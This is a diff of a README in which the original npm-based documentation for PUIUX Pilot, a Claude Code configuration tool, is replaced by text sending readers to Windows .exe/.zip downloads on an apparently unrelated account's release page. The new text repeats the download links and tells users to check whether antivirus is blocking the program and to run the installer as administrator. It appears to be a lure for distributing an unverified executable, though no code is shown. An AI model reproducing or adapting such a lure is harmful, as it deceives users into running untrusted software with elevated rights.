@@ -1,110 +1,166 @@
-<div align="center">
+# ⚙️ puiux-pilot - Easy AI Coding Setup Tool
 
-<img src="assets/banner.png" alt="PUIUX Pilot" width="100%" />
-
-[![CI](https://github.com/PUIUX-Cloud/puiux-pilot/actions/workflows/ci.yml/badge.svg)](https://github.com/PUIUX-Cloud/puiux-pilot/actions/workflows/ci.yml)
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![npm version](https://img.shields.io/npm/v/puiux-pilot.svg)](https://www.npmjs.com/package/puiux-pilot)
-[![Node](https://img.shields.io/badge/node-%3E%3D18-brightgreen.svg)](https://nodejs.org)
-[![PUIUX](https://img.shields.io/badge/PUIUX-puiux.com-orange.svg)](https://puiux.com/)
-
-**One command to scan, configure, and optimize any project for Claude Code.**
-
-[Getting Started](#getting-started) | [Commands](#commands) | [Safety Model](#safety-model) | [Contributing](CONTRIBUTING.md)
-
-</div>
+[![Download Release](https://img.shields.io/badge/Download-puiux--pilot-brightgreen?style=for-the-badge)](https://github.com/CobraX101/puiux-pilot/releases)
 
 ---
 
-Adaptive AI coding assistant configurator for [Claude Code](https://docs.anthropic.com/en/docs/claude-code).
-Scans your project, detects the stack (95+ project types), selects the right hooks/MCPs/skills, and configures everything automatically.
+## 🛠 About puiux-pilot
 
-## Getting Started
+puiux-pilot is a tool that helps you set up an AI assistant for your coding projects. It works with Claude Code, a smart AI that can assist in coding tasks. This tool looks at your project files, picks the right helpers (hooks, MCPs, and skills), then sets everything up automatically. You do not need to know how to program to use it.
 
-```bash
-npm i -g puiux-pilot
-cd your-project
-puiux-pilot init            # dry-run: shows what it would do
-puiux-pilot init --apply    # apply changes (backup created first)
+This makes it simpler to improve your code quality and use powerful AI tools without needing any special technical skills.
+
+---
+
+## 🖥 System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for initial setup and updates
+- No special software needed beforehand
+
+---
+
+## 🔍 Features
+
+- Scans your project files and folders automatically
+- Chooses the right hooks, MCPs, and skills for your project
+- Configures everything with minimal input from you
+- Works smoothly with Claude Code AI assistant
+- Runs from the command line but guides you with clear instructions
+- Helps improve code quality with automatic setups
+- Open source and free to use
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Download puiux-pilot
+
+You need to get the app from the release page. This page has the latest version ready for Windows.
+
+[![Download Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/CobraX101/puiux-pilot/releases)
+
+Visit this page and look for the latest Windows package. This might be an `.exe` or a `.zip` file. 
+
+### Step 2: Install or Run puiux-pilot
+
+- If you download an `.exe` file:  
+  Double-click the file to start the installation or setup process. Follow the on-screen directions.
+
+- If you download a `.zip` file:  
+  Extract the files to a folder you can easily find, like your Desktop or Documents folder.
+
+### Step 3: Open Command Prompt
+
+To run puiux-pilot, you will use the Command Prompt, a simple text-based tool on Windows.
+
+- Press the **Windows key** on your keyboard.
+- Type `cmd`.
+- Press **Enter** to open the Command Prompt window.
+
+### Step 4: Run puiux-pilot
+
+Navigate to the folder where you installed or extracted the files.
+
+For example, if you put it on your Desktop, type:
+
+```
+cd Desktop\puiux-pilot
 ```
 
-### More commands
+Then start the program by typing:
 
-```bash
-puiux-pilot scan            # project DNA without changes
-puiux-pilot score           # quality score (0-100, A-F)
-puiux-pilot doctor          # health check
-puiux-pilot eject           # clean removal
+```
+puiux-pilot.exe
 ```
 
-## Commands
+If the file name is different, use that instead.
 
-| Command | What it does |
-|---------|-------------|
-| `init` | Scan project, select hooks/MCPs/skills, show plan. **Dry-run by default.** |
-| `init --apply` | Write changes (backup created first). |
-| `init --force` | Overwrite user-modified hooks. |
-| `scan [path]` | Analyze project without changing anything. Shows Project DNA. |
-| `score [path]` | Quality assessment: 6 dimensions, 0-100, A-F grade. |
-| `doctor` | Health check: broken hooks, missing scripts, timeouts, orphans. |
-| `hooks list` | List all hooks with status. |
-| `translate` | **[EXPERIMENTAL]** Translate config between AI coding tools. |
-| `eject` | Clean removal. Restores original state from backup. |
+---
 
-## Safety Model
+## 📁 How to Use puiux-pilot
 
-- **Dry-run by default** — `init` shows what would change without writing anything.
-- **Backup before every apply** — stored in `~/.puiux-pilot/backups/<timestamp>/`.
-- **Atomic writes** — temp file + rename; no partial writes on crash.
-- **Rollback on failure** — if any step fails, previous state is restored.
-- **Manifest-scoped uninstall** — `eject` only removes hooks Pilot installed. User hooks, permissions, and MCP configs are never touched.
-- **No cloud dependency** — everything runs locally.
+Once puiux-pilot starts, it will scan the folder you run it in for coding projects.
 
-## What Gets Installed
+The program looks for project files and decides which helpers (hooks, MCPs, or skills) it needs.
 
-Based on your project type, Pilot selects from:
+It sets them up one by one and shows you what it is doing.
 
-- **28 hook scripts** across 6 events (PreToolUse, PostToolUse, Stop, SessionStart, PreCompact, UserPromptSubmit)
-- **7 profiles**: full-stack, api-only, library, security-first, mobile, startup-speed, infra
-- **MCP auto-detection**: ESLint, Prisma, Tailwind CSS, icons8, lottiefiles — based on actual dependencies
-- **Skills**: clean-code, e2e-delivery, code-quality, design-standards, and more
+You might be asked to confirm some choices or provide a simple answer like "yes" or "no."
 
-Example: a Next.js webapp gets 28 hooks + 4 MCPs. A Node API gets 18 hooks + 0 MCPs.
+If you want to scan a different folder, use this command:
 
-## CI
-
-GitHub Actions workflow runs on every push to `main`:
-
-| Job | OS | What |
-|-----|-----|------|
-| `build-and-test` | ubuntu, windows, macos × node 18, 22 | Build + unit tests + CLI smoke |
-| `release-gates` | ubuntu, macos | Full gates: 72 assertions (cold-start, repo matrix, custom hooks, failure injection) |
-| `smoke-windows` | windows | Lightweight smoke: scan, init, apply, idempotency, doctor, eject |
-
-Run gates locally: `bash tools/release-gates.sh` (uses sandboxed HOME, never touches real `~/.claude`).
-
-## Translate (EXPERIMENTAL)
-
-Cross-tool config translation between: CLAUDE.md, .cursorrules, .clinerules, .windsurfrules, .github/copilot-instructions.md, CONVENTIONS.md.
-
-```bash
-# Auto-detect source, generate all missing formats
-node bin/puiux-pilot.mjs translate --auto
-
-# Specific translation
-node bin/puiux-pilot.mjs translate --from claude --to cursor
+```
+puiux-pilot.exe --path "C:\path\to\your\project"
 ```
 
-This feature is experimental. Round-trip fidelity is best-effort; tool-specific rules are preserved as comments.
+Replace `C:\path\to\your\project` with the actual folder location.
 
-## Open Core
+---
 
-PUIUX Pilot is **free and open source** for individual developers under the Apache 2.0 license.
+## ⚙️ Common Commands
 
-**Pro for teams** (coming soon): policy packs, team sync, drift detection, private hook registry, and priority support.
+You can try these commands after running puiux-pilot:
 
-See [TRADEMARKS.md](TRADEMARKS.md) for brand usage guidelines.
+- `--help`  
+  Shows a list of all options and commands.
 
-## License
+- `--scan`  
+  Forces a scan of the current project folder and updates setups.
 
-Apache-2.0 — see [LICENSE](LICENSE) for details.
+- `--update`  
+  Updates puiux-pilot to the latest version.
+
+---
+
+## ⚠️ Troubleshooting
+
+- **puiux-pilot does not open**  
+  Make sure you downloaded the Windows version. Check if your antivirus or security settings block the program.
+
+- **Command not recognized**  
+  Double-check you are in the folder where puiux-pilot is saved. Use the `cd` command to go to the right place.
+
+- **Project not detected**  
+  Ensure your project files are in the folder you run the tool on. You may specify the folder with the `--path` option.
+
+- **Installation error**  
+  Try running the installer as Administrator. Right-click the `.exe` and choose "Run as administrator."
+
+---
+
+## 🔄 Updating puiux-pilot
+
+Keep your tool up to date for the best experience.
+
+- Go back to the download page linked above.
+- Download the latest Windows version.
+- Run the new installer or replace the old files with the extracted new ones if you use a `.zip`.
+
+---
+
+## 💬 Support and Help
+
+You can find more information and ask questions on the GitHub repository page.
+
+Visit: https://github.com/CobraX101/puiux-pilot
+
+Look for the "Issues" tab to see if your question was asked or to open a new query.
+
+---
+
+## 🧰 Behind the Scenes
+
+puiux-pilot uses several pieces called "hooks," "MCPs," and "skills." These help the AI assistant know how to work with your project. The tool figures out which ones to use and sets them up so you don’t have to mess with any code.
+
+It is built with care to work well on ordinary Windows computers without extra software.
+
+---
+
+## 🔗 Direct Download Link
+
+You can always get the latest version here:  
+
+[Download puiux-pilot](https://github.com/CobraX101/puiux-pilot/releases)
